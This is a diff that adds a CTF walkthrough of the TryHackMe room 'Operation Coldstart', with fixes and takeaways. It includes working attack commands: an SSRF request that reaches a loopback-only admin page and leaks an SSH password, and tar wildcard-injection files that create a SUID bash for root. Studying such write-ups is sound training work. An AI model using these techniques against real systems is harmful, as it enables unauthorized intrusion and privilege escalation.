@@ -1,0 +1,150 @@
+---
+title: 'Operation Coldstart'
+description: 'Anonymous FTP leaks the app source; its /preview endpoint is an SSRF guarded only by a hostname allow-list whose allowed host resolves to loopback, so we reach a 127.0.0.1-only admin page that leaks an SSH password, then a tar wildcard-injection cron escalates to root.'
+date: 2026-06-24
+platform: tryhackme
+room: 'Operation Coldstart'
+roomUrl: 'https://tryhackme.com/room/operationcoldstart'
+difficulty: easy
+tags:
+  - 'web'
+  - 'ssrf'
+  - 'ftp'
+  - 'linux'
+  - 'privesc'
+vulnClasses:
+  - 'server-side request forgery'
+  - 'wildcard injection'
+translation: done
+draft: false
+---
+
+_A walkthrough of the "Operation Coldstart" room from TryHackMe (Volt Labs URL Preview). Anonymous FTP hands us the application source, which reveals a server-side request forgery whose only guard is a hostname allow-list — and the allowed host resolves to loopback. That lets us reach an admin page meant only for 127.0.0.1, read an SSH password, and finish with a classic tar wildcard-injection cron for root._
+
+> Operation Coldstart is an authorized training challenge on TryHackMe; everything here was performed against a legal practice target. Both flags and the recovered SSH password are shown as `THM{<redacted>}` / `<redacted>` — real on the box, withheld here.
+
+---
+
+### **TL;DR**
+
+<Callout type="tldr">
+
+Anonymous FTP serves `backup.tar.gz` → the extracted `app.py` shows `/preview` is an **SSRF** whose only check is `urlparse(url).hostname in ALLOWED_HOSTS` (just `kestrel.thm`), with **no scheme or path validation** → `kestrel.thm` resolves to **127.0.0.1** on the box, and `/admin/` is gated only by `remote_addr.startswith("127.")` → so `?url=http://kestrel.thm/admin/notes` makes the server fetch its own admin notes, leaking the **`webdev`** **SSH password** → SSH in (user flag) → a root cron runs `tar czf ... *` in a writable dir, so drop `--checkpoint`/`--checkpoint-action` files for **tar wildcard injection** → SUID bash → root (flag).
+
+</Callout>
+
+### **The target**
+
+```text
+export IP=<target-ip>
+export ATTACKER_IP=<your-ip>
+```
+
+`nmap` shows anonymous-friendly FTP, SSH, and a Gunicorn web app:
+
+```text
+21/tcp open  ftp   vsftpd 3.0.5     # Anonymous FTP login allowed
+22/tcp open  ssh   OpenSSH 9.6p1 Ubuntu
+80/tcp open  http  Gunicorn         # URL Preview - Volt Labs
+```
+
+Anonymous FTP holds a single archive:
+
+```text
+ftp -A $IP        # login: anonymous
+# pub/backup.tar.gz
+tar -xvf backup.tar.gz   # voltlabs-preview/{app.py,README.md,requirements.txt}
+```
+
+### **The vulnerability**
+
+Reading `app.py` is the whole game. The `/preview` route fetches a user-supplied URL but only checks the **hostname** against an allow-list — the developer even flagged it in a comment:
+
+```text
+# VULN: hostname allow-list is the only check. No scheme check, no path check.
+host = (urlparse(target).hostname or "").lower()
+if host not in ALLOWED_HOSTS:   # ALLOWED_HOSTS = {"kestrel.thm"}
+    return "Host not in the approved internal allow-list", 403
+r = requests.get(target, timeout=3)   # full attacker-controlled path
+```
+
+Meanwhile the admin endpoint trusts the source address:
+
+```text
+@app.route("/admin/<path:p>")
+def admin(p="index"):
+    if not request.remote_addr.startswith("127."):
+        abort(403)
+    if p == "notes":
+        return open("/opt/voltlabs-preview/admin_notes.txt").read()
+```
+
+<Callout type="insight">
+
+The allow-list looks like a defence but is the whole exploit: `kestrel.thm` is pinned to **127.0.0.1** in the box’s `/etc/hosts`. So a request to `http://kestrel.thm/admin/notes` passes the hostname check, and because the server fetches it _itself_, the admin page sees `remote_addr = 127.0.0.1` and serves up its secrets. One allowed host that points at loopback turns an SSRF straight into a trusted-origin admin read.
+
+</Callout>
+
+### **Step 1 — SSRF to the loopback admin page → leak the SSH password**
+
+We feed the preview endpoint a URL on the allowed host but pointing at the admin notes. The server fetches its own `/admin/notes` from 127.0.0.1 and returns the content, which contains the `webdev` SSH password:
+
+```text
+curl -G "http://$IP/preview" --data-urlencode 'url=http://kestrel.thm/admin/notes'
+# -> admin_notes.txt: webdev SSH password = <redacted>
+```
+
+### **Step 2 — SSH as webdev (flag)**
+
+```text
+ssh webdev@$IP
+webdev@coldstart:~$ cat user.txt
+THM{<redacted>}
+```
+
+### **Step 3 — tar wildcard injection → root (flag)**
+
+`webdev` can’t sudo, but `pspy` catches a root-run cron using a wildcard:
+
+```text
+CMD: UID=0  PID=1587 | tar czf /var/backups/uploads.tgz *
+```
+
+When `tar ... *` runs in a directory we can write to, the shell expands `*` to the filenames present — so files named like tar options are handed to tar as real flags. `--checkpoint-action=exec=` runs a command at each checkpoint, as root:
+
+```text
+cd /opt/backups          # the writable directory the cron globs
+echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' > shell.sh
+touch -- '--checkpoint=1'
+touch -- '--checkpoint-action=exec=sh shell.sh'
+# wait for the next cron tick...
+/tmp/bash -p             # SUID bash -> euid 0
+# cat /root/flag.txt -> THM{<redacted>}
+```
+
+### **Impact**
+
+<Callout type="critical">
+
+**High — CVSS 3.1 \~8.6** (`AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:L`). An unauthenticated SSRF reaches an internal admin endpoint that trusts loopback, disclosing an SSH credential and giving an interactive foothold. A root cron that globs an attacker-writable directory with `tar *` then allows wildcard injection and a SUID-bash escalation to full root — complete host compromise.
+
+</Callout>
+
+### **Recommended fix**
+
+<Callout type="fix">
+
+- **Fix the SSRF properly.** A hostname allow-list is not enough: enforce the scheme (`http`/`https` only), resolve and reject private/loopback addresses, and don’t forward the full attacker-controlled path. Better, drop the user-supplied fetch entirely.
+- **Don’t authenticate by source IP.** `remote_addr == 127.0.0.1` is trivially satisfied via SSRF; require a real admin session.
+- **Never run** **`tar *`** **(or any glob) from a writable directory in a privileged cron.** Use an absolute file list, `--` to end options, or `find ... -print0 | tar --null -T -`.
+- **Don’t leave source archives on anonymous FTP.**
+
+</Callout>
+
+### **Takeaways**
+
+- **An allow-list that resolves to loopback is an open door.** The “only approved host” was the internal one.
+- **SSRF + IP-based trust = authentication bypass.** The server became its own trusted client.
+- **`tar *`** **in a writable path is root.** Option-injection via crafted filenames is one of the oldest cron tricks — and still works.
+
+Operation Coldstart is a compact lesson in how “defensive” checks (an allow-list, an IP gate) become the exploit. Thanks for reading.
